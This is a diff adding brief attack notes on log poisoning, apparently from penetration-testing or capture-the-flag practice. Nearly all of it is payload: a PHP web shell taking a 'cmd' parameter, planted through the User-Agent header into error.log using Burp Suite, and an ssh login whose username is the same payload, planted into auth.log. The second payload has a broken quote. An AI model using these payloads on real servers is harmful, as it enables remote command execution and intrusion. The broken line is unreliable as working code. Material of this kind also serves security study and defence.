@@ -1,0 +1,10 @@
+#ERROR.log poisoning
+#error.log if able to write
+#fireup burpsuite
+#added php script on user-agent
+
+user-agent: <?php system($_GET['cmd']);?>
+
+#auth.log poisoning
+
+ssh '<?php system($_GET['cmd]);?>'@<ip-here>
